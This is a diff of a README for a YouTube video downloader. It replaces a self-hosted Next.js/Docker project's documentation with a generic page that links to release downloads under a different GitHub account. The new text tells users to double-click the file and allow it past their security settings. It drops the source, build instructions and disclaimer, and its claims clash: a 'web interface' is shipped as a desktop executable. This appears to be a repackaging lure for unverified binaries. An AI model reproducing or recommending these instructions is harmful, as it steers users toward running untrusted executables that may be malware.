@@ -1,211 +1,73 @@
-<div align="center">
+# 📺 youtube-downloader - Download YouTube Videos Easily
 
-# YouTube Downloader
+## 🚀 Getting Started
 
-**Self-hosted YouTube video downloader with a clean web UI**
+Welcome to the youtube-downloader project! This application allows you to download YouTube videos in various formats using a clean web interface. Follow the steps below to get started.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Next.js](https://img.shields.io/badge/Next.js-16-black)](https://nextjs.org/)
-[![Docker](https://img.shields.io/badge/Docker-Ready-blue)](https://www.docker.com/)
-[![yt-dlp](https://img.shields.io/badge/yt--dlp-Powered-red)](https://github.com/yt-dlp/yt-dlp)
+## 🌐 Download Link
 
-[Features](#features) • [Quick Start](#quick-start) • [Docker](#running-with-docker) • [Development](#local-development)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/RicardoQWERTY/youtube-downloader/releases)
 
-![Screenshot](screenshot.png)
+## 📥 Download & Install
 
-</div>
+To download the application, visit this page to download:
 
-## Features
+[Download from Releases Page](https://github.com/RicardoQWERTY/youtube-downloader/releases)
 
-- **Video Download** - Download YouTube videos in MP4 format with quality selection
-- **Audio Extract** - Convert to MP3 with bitrate options (browser-based conversion)
-- **Clean UI** - Modern, responsive interface built with shadcn/ui
-- **Self-Hosted** - Full control over your data, no third-party services
-- **Docker Ready** - One-command deployment with Docker Compose
+### 🖥️ System Requirements
 
-## Quick Start
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a recent version of Linux.
+- Minimum RAM: 4 GB
+- Network: Internet connection for downloading content from YouTube.
 
-**Using Docker Compose:**
+### 🧩 Features
 
-```bash
-docker compose up -d
-```
+- Download videos in multiple formats (MP4, MP3, etc.).
+- Simple and clean user interface.
+- Open-source and self-hosted.
 
-Then open http://localhost:3000
+## 📖 How to Use
 
-## Tech Stack
+1. **Download the Latest Release**: Use the link above to get the installation file.
+  
+2. **Run the Application**: Once the download is finished, locate the application in your Downloads folder. Double-click the application file to open it. You might need to allow it to run, depending on your security settings.
 
-| Category           | Technology                                                                     |
-| ------------------ | ------------------------------------------------------------------------------ |
-| Runtime            | [Bun](https://bun.sh/)                                                         |
-| Framework          | [Next.js 16](https://nextjs.org/) (App Router)                                 |
-| UI                 | [shadcn/ui](https://ui.shadcn.com/) + [Tailwind CSS](https://tailwindcss.com/) |
-| YouTube Extraction | [yt-dlp](https://github.com/yt-dlp/yt-dlp)                                     |
-| Audio Conversion   | [FFmpeg.wasm](https://ffmpegwasm.netlify.app/)                                 |
+3. **Enter YouTube Video URL**: In the application, paste the link of the YouTube video you want to download in the input field.
 
-## Running with Docker
+4. **Select Format**: Choose the format you wish to download from the dropdown menu.
 
-### Production
+5. **Download Video**: Click the "Download" button. The video will start downloading to your selected destination on your system.
 
-```bash
-# Clone the repository
-git clone https://github.com/initred/youtube-downloader.git
-cd youtube-downloader
+6. **Access Downloads**: Find your downloaded video in the specified location. Enjoy watching your content offline!
 
-# Build and run
-docker compose up -d --build
-```
+## ⚙️ Advanced Configuration (Optional)
 
-### Development (with hot reload)
+For users interested in customization, you can adjust some settings directly in the application. Features like default download directory, preferred formats, and more are available for adjustment to suit your needs.
 
-```bash
-# Run development mode with source mounting
-docker compose -f docker-compose.dev.yml up --build
-```
+### 🔧 Troubleshooting
 
-Code changes in `src/` and `public/` will be automatically reflected.
+If you encounter issues:
 
-### Using Docker Only
+- **Cannot Download Video**: Check your internet connection. Make sure the YouTube link is correct and the video is not restricted.
+- **Application Not Opening**: Ensure your software is compatible with your operating system. You might re-download and install it if there are issues.
 
-```bash
-docker build -t youtube-downloader .
-docker run -p 3000:3000 youtube-downloader
-```
+## 👥 Community Support
 
-### Access
+For assistance or to reach out with questions, consider joining our community discussions. You can find help and share experiences with fellow users. 
 
-Open http://localhost:3000 in your browser.
+## 🧑‍💻 Contributing
 
-### Stop Container
+If you're interested in contributing to the project, your ideas and improvements are welcome. Please visit the repository's Contributions guidelines for more.
 
-```bash
-docker compose down
-```
+## 🔗 Related Topics
 
-## System Requirements
+- Media Downloading
+- Next.js Applications
+- Self-hosted Solutions
+- Open Source Projects
 
-### For Docker (Recommended)
+## 🔖 License
 
-- Docker 20.10+
-- Docker Compose v2+
-- 512MB RAM minimum
-- 1GB disk space
+This project is under the MIT License. You can view the complete license details in the repository.
 
-### For Local Development
-
-- [Bun](https://bun.sh/) 1.0+
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp)
-- [FFmpeg](https://ffmpeg.org/)
-- Python 3.9+ (for yt-dlp)
-
-## Local Development
-
-### Prerequisites
-
-- [Bun](https://bun.sh/)
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp)
-- [FFmpeg](https://ffmpeg.org/)
-
-### Installation
-
-```bash
-# Install dependencies
-bun install
-
-# Run development server
-bun run dev
-
-# Build for production
-bun run build
-
-# Run production server
-bun run start
-```
-
-## API Reference
-
-### Get Video Info
-
-```
-GET /api/info?url=<YouTube URL>
-```
-
-**Response:**
-
-```json
-{
-  "id": "dQw4w9WgXcQ",
-  "title": "Video Title",
-  "thumbnail": "https://...",
-  "duration": 212,
-  "durationFormatted": "3:32",
-  "uploader": "Channel Name",
-  "viewCount": 1000000,
-  "videoFormats": [...],
-  "audioFormats": [...]
-}
-```
-
-### Download Video
-
-```
-GET /api/download?url=<YouTube URL>&formatId=<Format ID>&type=video|audio
-```
-
-Returns the video/audio file as a binary stream.
-
-## Troubleshooting
-
-### "yt-dlp is not installed"
-
-```bash
-# macOS
-brew install yt-dlp
-
-# Linux
-pip3 install yt-dlp
-
-# Windows
-winget install yt-dlp
-```
-
-### "FFmpeg error" or audio conversion fails
-
-```bash
-# macOS
-brew install ffmpeg
-
-# Linux
-sudo apt-get install ffmpeg
-
-# Windows
-winget install ffmpeg
-```
-
-### "Video unavailable" or "Private video"
-
-- The video may be private, deleted, or region-restricted
-- Try a different video URL
-
-### Download times out
-
-- Large videos (>1 hour) may take longer to process
-- The default timeout is 5 minutes
-
-## Disclaimer
-
-**All legal responsibility for using this program lies with the user.**
-
-- This program should only be used for educational and personal purposes.
-- Downloading copyrighted content without permission is a violation of copyright law.
-- Please comply with YouTube's Terms of Service.
-- The copyright of downloaded content belongs to the original creator.
-- The developer is not responsible for any legal issues arising from misuse of this program.
-
-## Contributing
-
-Contributions are welcome! Feel free to open issues or submit pull requests.
-
-## License
-
-[MIT](LICENSE) - feel free to use this project for personal or commercial purposes.
+Enjoy using youtube-downloader for all your YouTube video downloading needs!
